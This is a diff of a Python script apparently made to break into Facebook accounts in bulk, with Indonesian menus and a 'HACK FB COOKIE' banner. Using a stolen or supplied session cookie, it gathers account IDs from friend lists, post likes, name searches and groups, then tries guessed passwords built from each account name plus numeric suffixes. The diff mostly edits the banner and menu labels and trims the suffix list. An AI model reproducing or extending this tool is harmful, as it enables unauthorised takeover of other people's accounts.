@@ -1,6 +1,7 @@
  
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+import requests
 import os
 import sys
 import re
@@ -19,35 +20,30 @@ def kata(s):
         time.sleep(1./300)
 def baner():
     time.sleep(0.1)
-    kata("""\n\t\033[92m###\033[94m(\033[91m^__^\033[94m)\033[92m###
-\t\033[90m ——————————————————————\033[92m\n
-\t\033[00m      HACK FACEBOOK
-\t\033[90m ——————————————————————\033[92m\n
+    kata("""\n\t\033[90m*  *  *\033[92m┌∩┐\033[94m(\033[91m^__^\033[94m)\033[92m┌∩┐\033[90m~  ~  ~
+\t\033[00m HACK FB COOKIE
+\t\033[90m -----------------------\033[94m\n
 ===========================================\033[00m
-Author  \033[1;91m: \033[1;96mNicoID\033[00m
-Creator \033[1;91m: \033[1;96mNico\033[00m
-Youtube \033[1;91m: \033[1;96mSuhat Nico\033[00m
-Suport  \033[1;91m: \033[1;96mBezer\033[00m
-Team    \033[1;91m: \033[1;96mB3GINERS CODE\033[00m
+Creator \033[1;91m: \033[1;96mNicoID\033[00m
+Youtube \033[1;91m: \033[1;96mSuhat Nico12\033[00m
 Github  \033[1;91m: \033[4;92mgithub.com/SUHAT-NICO\033[00m
-WARNING \033[1;91m!!! \033[1;96mGUNAKAN DENGAN BIJAK\033[00m
-\033[92m===========================================\033[00m""")
+\033[94m===========================================\033[00m""")
 def balik():
     f=input("\033[00m\t[\033[96mEnter To Back\033[00m]")
     if f == "":
-       os.system("python nic.py")
+       os.system("python mbf.py")
     else:
        sys.exit("\033[1;91mexit\033[00m")
 def mbf():
     time.sleep(0.1)
-    print("\033[00m[\033[93m1\033[00m] \033[4;92mLogin")
-    print("\033[00m[\033[93m2\033[00m] \033[4;92mUpdate")
-    print("\033[00m[\033[93m3\033[00m] \033[4;92mGroup WA")
-    print("\033[00m[\033[93m4\033[00m] \033[1;91mExit")
+    print("\033[00m[\033[93m1\033[00m] Login")
+    print("\033[00m[\033[93m2\033[00m] Update")
+    print("\033[00m[\033[93m3\033[00m] Group WA")
+    print("\033[00m[\033[93m4\033[00m] Exit")
     time.sleep(0.1)
     f=input("\n\033[90m> \033[1;93m")
     if f == "1":
-         print("\033[1;92m===========================================\033[00m")
+         print("\033[1;94m===========================================\033[00m")
          mbasic = 'https://mbasic.facebook.com{}'
          global die,check,result, count
          id = []
@@ -186,13 +182,13 @@ def mbf():
                    kuki = {'cookie':kukis}
                    clear()
                    baner()
-                   kata('\033[1;97m[\033[1;93m1\033[1;97m] \033[00mCrack Teman')
-                   kata('\033[1;97m[\033[1;93m2\033[1;97m] \033[00mCrack Dari Status\033[1;97m ')
-                   kata('\033[1;97m[\033[1;93m3\033[1;97m] \033[00mCrack Nama')
-                   kata('\033[1;97m[\033[1;93m4\033[1;97m] \033[00mCrack  Grup ')
+                   kata('\033[1;97m[\033[1;93m1\033[1;97m] \033[00mCrack Daftar Teman')
+                   kata('\033[1;97m[\033[1;93m2\033[1;97m] \033[00mCrack Dari Like Post\033[1;97m ')
+                   kata('\033[1;97m[\033[1;93m3\033[1;97m] \033[00mCrack Dari Pencarian Nama')
+                   kata('\033[1;97m[\033[1;93m4\033[1;97m] \033[00mCrack Dari Grup ')
                    kata('\033[1;97m[\033[1;93m5\033[1;97m] \033[00mCrack Dari Teman')
-                   kata('\033[1;97m[\033[1;93m6\033[1;97m] \033[00mCek Hasil Crack')
-                   kata('\033[92m===========================================\033[0m\n')
+                   kata('\033[1;97m[\033[1;93m6\033[1;97m] \033[00mLihat Hasil Crack')
+                   kata('\033[94m===========================================\033[0m\n')
                    print()
                    tanya = input('\033[90m> \033[1;93m ')
                    if tanya =="":
@@ -270,9 +266,6 @@ def mbf():
                                                   str(x) + '12345',
                                                   str(x) + '123456',
                                                   str(x) + '12',
-                                                  str(x) + '321',
-                                                  str(x) + '4321',
-                                                  str(x) + '54321',
                                                   ]
                                           listpass.append(expass)
                                           for passw in set(listpass):
